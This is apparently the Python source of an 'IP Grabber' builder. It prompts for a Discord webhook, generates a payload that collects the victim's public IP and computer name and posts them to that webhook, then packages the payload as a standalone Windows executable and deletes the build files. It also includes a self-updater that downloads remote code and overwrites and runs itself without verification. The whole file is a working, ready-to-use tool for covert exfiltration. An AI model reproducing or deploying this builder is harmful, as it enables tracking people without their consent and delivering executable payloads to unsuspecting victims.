from colorama import Fore
import time
import os
import shutil
import ctypes
import requests

from pystyle import Colors, Colorate, Write, Center, Box


__version__ = "3.0"
os.system('cls')
ctypes.windll.kernel32.SetConsoleTitleW("IP Grabber | by pierro | v" + __version__)

class AutoUpdate: #credit to kdot
    def __init__(self):
        self.code = (
            "https://github.com/xpierroz/IPGrabber/blob/main/main.py"
        )
        self.update()

    def update(self):
        code = requests.get(self.code, timeout=10).text
        with open(__file__, "r", encoding="utf-8") as f:
            main_code = f.read()
        if code != main_code:
            with open(__file__, "w", encoding="utf-8") as f:
                f.write(code)
            os.startfile(__file__)
            os._exit(0)
                

def main():
    os.system('cls')
    banner = """
/$$$$$$ /$$$$$$$
|_  $$_/| $$__  $$
  | $$  | $$  \ $$
  | $$  | $$$$$$$/
  | $$  | $$____/
  | $$  | $$
 /$$$$$$| $$
|______/|__/
"""
    print(Colorate.Horizontal(Colors.green_to_blue, Center.XCenter(banner), 1))
    print(Colorate.Horizontal(Colors.green_to_blue, Box.Lines("made by . pierro")))
    print('\n')
    wbh_url = Write.Input("    .$ Enter your WebHook url -> ", Colors.red_to_purple, interval=0.025)
    fh_name = Write.Input("    .$ Enter your file output name -> ", Colors.red_to_purple, interval=0.0025)

    
    rm = f"""
import requests
import dhooks
import os
import sys
    
r = requests.get('https://api.ipify.org/')
rct = r.text

c = os.getenv('COMPUTERNAME')
    
hook = dhooks.Webhook('{wbh_url}')
hook.send(c + "'s IP: " + rct)


    """
    with open(f"{fh_name}.py", "w") as f:
        f.write(rm)
    
    print(Colorate.Horizontal(Colors.green_to_blue, "    .$ Main File Created", 1))
    print('\n')
    print(Colorate.Horizontal(Colors.rainbow, "    .$ Compiling | Please wait ...", 1)) 
        
    os.system('echo off')
    print(Fore.BLACK)   
    os.system(f'pyinstaller --onefile --icon=static/logo.ico {fh_name}.py')
    os.system('cls')
    print(Colorate.Horizontal(Colors.rainbow, "    .$ Successfuly Compiled", 1))   
    print('\n')
    print(Colorate.Horizontal(Colors.yellow_to_green, "    .$ Deleting Unused Files/Directory | Please wait ...", 1)) 
    os.rename(f'dist/{fh_name}.exe',f'{fh_name}.exe') 
    os.remove(f"{fh_name}.spec")
    os.remove(f"{fh_name}.py")
    os.rmdir("dist")
    shutil.rmtree("__pycache__")
    shutil.rmtree("build")
    print(Colorate.Horizontal(Colors.yellow_to_green, "    .$ Successfuly Deleted Unused Files/Directory", 1)) 
    print(Colorate.Horizontal(Colors.red_to_purple, "    .$ Graber compiled", 1)) 
    time.sleep(2)
 
AutoUpdate()   
main()
time.sleep(100)